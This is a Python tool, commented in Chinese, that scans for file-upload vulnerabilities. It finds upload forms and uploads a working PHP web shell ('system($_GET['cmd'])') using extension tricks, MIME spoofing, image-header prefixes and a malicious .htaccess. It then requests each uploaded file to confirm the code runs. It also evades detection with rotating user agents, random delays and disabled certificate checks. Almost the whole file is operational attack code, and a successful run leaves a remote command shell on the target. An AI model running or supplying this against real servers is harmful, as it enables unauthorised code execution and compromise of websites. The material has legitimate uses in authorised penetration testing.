#!/usr/bin/env python3
"""
文件上传漏洞检测工具
检测上传点，测试扩展名绕过（双扩展名、大小写、空字节、空格）、
MIME 类型绕过、Content-Type 绕过、内容检测绕过（GIF89a 头）、
.htaccess 上传，并尝试访问上传文件验证执行。
"""

import argparse
import json
import os
import random
import re
import ssl
import sys
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 反反爬策略：随机 User-Agent 池（20+）
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

DELAY_MIN = 1.0
DELAY_MAX = 3.0


def random_delay():
    """随机延迟 1-3 秒"""
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))


def create_ssl_context():
    """创建 TLS 指纹伪装 SSL 上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS")
        except Exception:
            pass
        return ctx
    except Exception:
        return None


def build_headers(url, cookie=None):
    """构建反反爬请求头"""
    parsed = urllib.parse.urlparse(url)
    referer = parsed.scheme + "://" + parsed.netloc + "/" if parsed.netloc else url
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": referer,
        "Connection": "keep-alive",
    }
    if cookie:
        headers["Cookie"] = cookie
    return headers


def build_multipart_formdata(field_name, filename, file_content, content_type="application/octet-stream", extra_fields=None):
    """构建 multipart/form-data 请求体"""
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    lines = []
    # 额外字段
    if extra_fields:
        for key, value in extra_fields.items():
            lines.append("--{}".format(boundary))
            lines.append('Content-Disposition: form-data; name="{}"'.format(key))
            lines.append("")
            lines.append(str(value))
    # 文件字段
    lines.append("--{}".format(boundary))
    lines.append('Content-Disposition: form-data; name="{}"; filename="{}"'.format(field_name, filename))
    lines.append("Content-Type: {}".format(content_type))
    lines.append("")
    lines.append(file_content)
    lines.append("--{}--".format(boundary))
    body = "\r\n".join(lines)
    return body.encode("utf-8"), "multipart/form-data; boundary={}".format(boundary)


def make_request(url, method="GET", data=None, cookie=None, proxy=None, timeout=10, content_type=None):
    """发起带反反爬策略的 HTTP 请求"""
    ctx = create_ssl_context()
    headers = build_headers(url, cookie)
    if content_type:
        headers["Content-Type"] = content_type
    post_data = None
    if data is not None:
        if isinstance(data, bytes):
            post_data = data
        elif isinstance(data, str):
            post_data = data.encode("utf-8")
    req = urllib.request.Request(url, data=post_data, headers=headers, method=method.upper())
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        handlers = [proxy_handler]
    else:
        handlers = []
    if ctx:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()
    try:
        resp = opener.open(req, timeout=timeout)
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.getcode()
        resp_headers = dict(resp.headers)
        return status, body, resp_headers
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            pass
        return e.code, body, dict(e.headers) if e.headers else {}
    except Exception:
        return None, None, None


# ============================================================
# 文件上传绕过 Payload
# ============================================================

PHP_SHELL = "<?php echo 'upload_test_ok'; system($_GET['cmd']); ?>"
PHP_INFO = "<?php phpinfo(); ?>"
HTACCESS = "AddType application/x-httpd-php .jpg"

# 扩展名绕过测试
EXTENSION_BYPASSES = [
    {"name": "双扩展名", "filename": "test.php.jpg", "content": PHP_SHELL},
    {"name": "大小写混淆", "filename": "test.PhP", "content": PHP_SHELL},
    {"name": "空字节截断", "filename": "test.php%00.jpg", "content": PHP_SHELL},
    {"name": "空格结尾", "filename": "test.php ", "content": PHP_SHELL},
    {"name": "点号结尾", "filename": "test.php.", "content": PHP_SHELL},
    {"name": "::$DATA", "filename": "test.php::$DATA", "content": PHP_SHELL},
    {"name": "phtml", "filename": "test.phtml", "content": PHP_SHELL},
    {"name": "pht", "filename": "test.pht", "content": PHP_SHELL},
    {"name": "php5", "filename": "test.php5", "content": PHP_SHELL},
    {"name": "php7", "filename": "test.php7", "content": PHP_SHELL},
]

# MIME 绕过测试
MIME_BYPASSES = [
    {"name": "image/jpeg+php", "filename": "test.php", "content": PHP_SHELL, "mime": "image/jpeg"},
    {"name": "image/png+php", "filename": "test.php", "content": PHP_SHELL, "mime": "image/png"},
    {"name": "image/gif+php", "filename": "test.php", "content": PHP_SHELL, "mime": "image/gif"},
    {"name": "application/octet+php", "filename": "test.php", "content": PHP_SHELL, "mime": "application/octet-stream"},
]

# 内容检测绕过
CONTENT_BYPASSES = [
    {"name": "GIF89a+php", "filename": "test.php", "content": "GIF89a\n" + PHP_SHELL},
    {"name": "JPEG头+php", "filename": "test.php", "content": "\xff\xd8\xff\xe0" + PHP_SHELL},
    {"name": "GIF89a+双扩展名", "filename": "test.php.jpg", "content": "GIF89a\n" + PHP_SHELL},
]


def detect_upload_form(url, cookie=None, proxy=None, timeout=10):
    """检测上传表单"""
    random_delay()
    status, body, _ = make_request(url, "GET", None, cookie, proxy, timeout)
    if not body:
        return None

    # 查找 file input
    file_input_pattern = re.compile(
        r'<input[^>]*type=["\']?file["\']?[^>]*name=["\']?([^"\'>\s]*)["\']?[^>]*>',
        re.IGNORECASE,
    )
    matches = file_input_pattern.findall(body)
    if matches:
        return matches[0]

    # 查找 form 中的 enctype
    form_pattern = re.compile(r'<form[^>]*enctype=["\']?multipart/form-data["\']?[^>]*>', re.IGNORECASE)
    if form_pattern.search(body):
        # 尝试提取文件字段名
        name_pattern = re.compile(r'<input[^>]*name=["\']?([^"\'>\s]*)["\']?[^>]*>', re.IGNORECASE)
        all_names = name_pattern.findall(body)
        for name in all_names:
            if any(kw in name.lower() for kw in ["file", "upload", "img", "image", "attachment"]):
                return name
    return None


def upload_file(url, field, filename, content, mime="application/octet-stream", cookie=None, proxy=None, timeout=10):
    """上传文件到目标"""
    body_bytes, content_type = build_multipart_formdata(field, filename, content, mime)
    random_delay()
    status, resp_body, resp_headers = make_request(url, "POST", body_bytes, cookie, proxy, timeout, content_type)
    return status, resp_body, resp_headers


def try_access_uploaded(url, resp_body, resp_headers, cookie=None, proxy=None, timeout=10):
    """尝试访问上传的文件验证执行"""
    # 从响应中提取上传文件路径
    upload_paths = []
    if resp_body:
        # 查找常见上传路径模式
        path_patterns = [
            r'["\']([^"\']*\.(?:php|phtml|pht|php5|php7|jpg|png|gif|jpeg))["\']',
            r'href=["\']?([^"\'>\s]+\.(?:php|phtml|pht|jpg|png|gif))["\']?',
            r'src=["\']?([^"\'>\s]+\.(?:php|phtml|pht|jpg|png|gif))["\']?',
            r'(?:url|path|file|location)["\']?\s*[:=]\s*["\']?([^"\'>\s]+\.(?:php|phtml|pht|jpg|png|gif))',
        ]
        for pattern in path_patterns:
            for m in re.finditer(pattern, resp_body, re.IGNORECASE):
                path = m.group(1)
                if path and path not in upload_paths:
                    upload_paths.append(path)

    # 尝试访问每个可能的路径
    for path in upload_paths[:5]:
        if not path.startswith("http"):
            if path.startswith("/"):
                base = urllib.parse.urlparse(url)
                path = "{}://{}{}".format(base.scheme, base.netloc, path)
            else:
                path = urllib.parse.urljoin(url, path)
        random_delay()
        status, body, _ = make_request(path, "GET", None, cookie, proxy, timeout)
        if status == 200 and body:
            executed = "upload_test_ok" in body or "phpinfo" in body.lower()
            return {
                "accessible": True,
                "url": path,
                "executed": executed,
                "body_snippet": body[:200],
            }
    return {"accessible": False, "tried_paths": upload_paths[:5]}


def scan_upload(url, field=None, cookie=None, proxy=None, timeout=10):
    """文件上传漏洞扫描"""
    # 检测上传字段
    if not field:
        field = detect_upload_form(url, cookie, proxy, timeout)
    if not field:
        return {"url": url, "error": "未检测到文件上传表单"}

    results = {
        "url": url,
        "field": field,
        "is_vulnerable": False,
        "extension_bypass": [],
        "mime_bypass": [],
        "content_bypass": [],
        "htaccess_upload": None,
    }

    # 测试扩展名绕过
    for bypass in EXTENSION_BYPASSES:
        status, body, headers = upload_file(
            url, field, bypass["filename"], bypass["content"],
            "application/octet-stream", cookie, proxy, timeout
        )
        upload_success = status and status in (200, 201) and "error" not in (body or "").lower()
        if upload_success:
            access_result = try_access_uploaded(url, body, headers, cookie, proxy, timeout)
            results["extension_bypass"].append({
                "technique": bypass["name"],
                "filename": bypass["filename"],
                "status_code": status,
                "uploaded": upload_success,
                "accessible": access_result.get("accessible", False),
                "executed": access_result.get("executed", False),
                "access_url": access_result.get("url", ""),
            })
            if access_result.get("executed"):
                results["is_vulnerable"] = True
        else:
            results["extension_bypass"].append({
                "technique": bypass["name"],
                "filename": bypass["filename"],
                "status_code": status,
                "uploaded": False,
            })

    # 测试 MIME 绕过
    for bypass in MIME_BYPASSES:
        status, body, headers = upload_file(
            url, field, bypass["filename"], bypass["content"],
            bypass["mime"], cookie, proxy, timeout
        )
        upload_success = status and status in (200, 201) and "error" not in (body or "").lower()
        if upload_success:
            access_result = try_access_uploaded(url, body, headers, cookie, proxy, timeout)
            results["mime_bypass"].append({
                "technique": bypass["name"],
                "filename": bypass["filename"],
                "mime": bypass["mime"],
                "status_code": status,
                "uploaded": upload_success,
                "accessible": access_result.get("accessible", False),
                "executed": access_result.get("executed", False),
            })
            if access_result.get("executed"):
                results["is_vulnerable"] = True
        else:
            results["mime_bypass"].append({
                "technique": bypass["name"],
                "filename": bypass["filename"],
                "mime": bypass["mime"],
                "status_code": status,
                "uploaded": False,
            })

    # 测试内容检测绕过
    for bypass in CONTENT_BYPASSES:
        status, body, headers = upload_file(
            url, field, bypass["filename"], bypass["content"],
            "image/jpeg", cookie, proxy, timeout
        )
        upload_success = status and status in (200, 201) and "error" not in (body or "").lower()
        if upload_success:
            access_result = try_access_uploaded(url, body, headers, cookie, proxy, timeout)
            results["content_bypass"].append({
                "technique": bypass["name"],
                "filename": bypass["filename"],
                "status_code": status,
                "uploaded": upload_success,
                "accessible": access_result.get("accessible", False),
                "executed": access_result.get("executed", False),
            })
            if access_result.get("executed"):
                results["is_vulnerable"] = True
        else:
            results["content_bypass"].append({
                "technique": bypass["name"],
                "filename": bypass["filename"],
                "status_code": status,
                "uploaded": False,
            })

    # 测试 .htaccess 上传
    status, body, headers = upload_file(
        url, field, ".htaccess", HTACCESS,
        "text/plain", cookie, proxy, timeout
    )
    upload_success = status and status in (200, 201) and "error" not in (body or "").lower()
    results["htaccess_upload"] = {
        "uploaded": upload_success,
        "status_code": status,
    }
    if upload_success:
        results["is_vulnerable"] = True

    return results


def main():
    parser = argparse.ArgumentParser(
        description="文件上传漏洞检测工具 - 测试扩展名/MIME/内容绕过和 .htaccess 上传",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="示例:\n  %(prog)s --url http://example.com/upload --field file\n  %(prog)s --url http://example.com/upload --output result.json",
    )
    parser.add_argument("--url", required=True, help="目标上传 URL")
    parser.add_argument("--field", help="文件字段名（可选，自动检测）")
    parser.add_argument("--cookie", help="Cookie 字符串（可选）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数（默认 10）")
    parser.add_argument("--proxy", help="代理地址（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        result = scan_upload(args.url, args.field, args.cookie, args.proxy, args.timeout)
        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except KeyboardInterrupt:
        print(json.dumps({"error": "用户中断"}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"error": "扫描失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
